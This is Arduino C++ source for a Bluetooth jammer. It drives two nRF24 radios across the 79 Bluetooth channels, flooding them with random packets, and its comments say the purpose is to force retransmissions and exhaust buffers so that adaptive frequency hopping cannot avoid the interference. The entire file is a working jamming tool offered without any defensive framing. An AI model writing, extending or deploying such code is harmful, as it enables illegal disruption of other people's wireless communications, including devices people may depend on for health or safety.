#include "attack.h"
#include "radio.h"

static int attack_counter = 0;

void attack_init() {
    Serial.println(F("[ATTACK] Packet Flooding Jammer (Anti-AFH Collision) Initialized"));
}

void attack_run_step(int& counter) {
    if (!radios_ready()) {
        return;
    }

    RF24& r1 = get_radio_1();
    RF24& r2 = get_radio_2();

    uint8_t payload[32];
    for (int i = 0; i < 32; i++) {
        payload[i] = (uint8_t)random(256);
    }

    // Packet collision flooding (forces BT retransmissions and buffer exhaustion)
    for (int i = 0; i < 40; i++) {
        attack_counter++;
        uint8_t ch1 = (uint8_t)(attack_counter % 79);
        uint8_t ch2 = (uint8_t)((attack_counter + 39) % 79);

        r1.setChannel(ch1);
        r2.setChannel(ch2);

        r1.stopListening();
        r2.stopListening();

        r1.writeFast(payload, sizeof(payload));
        r2.writeFast(payload, sizeof(payload));
    }

    r1.txStandBy();
    r2.txStandBy();

    counter = attack_counter;
}
